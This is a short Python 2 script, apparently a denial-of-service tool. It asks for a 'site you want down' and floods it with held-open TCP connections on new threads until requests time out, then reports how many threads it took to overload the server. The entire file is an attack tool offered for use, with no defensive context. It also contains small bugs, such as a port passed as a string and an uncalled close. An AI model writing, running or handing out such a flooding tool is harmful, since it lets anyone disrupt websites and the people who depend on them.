from os import *
from socket import *
from string import *
from random import *
from time import *
from thread import *
import requests
import urllib

host = raw_input("Site you want down: ")
port = raw_input("Port number: ")
time = raw_input("how long should you wait for timeout (SECONDS): ")

def connect(i):
    sock1 = socket(AF_INET, SOCK_STREAM)
    try:
        sock1.connect((host, port))
        sleep(10000)
        sock1.close
    except:
        print "The site is down"

i = 0
n = 1
url = "http://" + host + ":" + port
port = int(port)
time = int(time)

while 1:
	try:
		r = requests.get(url, timeout=time)
	except:
		print ("server is down")
		print ("It took " + str(i) + " threads to overload the server")
		exit()
	print r.status_code
	print url
	try:
		start_new_thread(connect, (n,))
	except:
		print "Connection Lost. Restart DOS"
	print "FLOODING!"
	i = i + 1
	sleep(0.1)
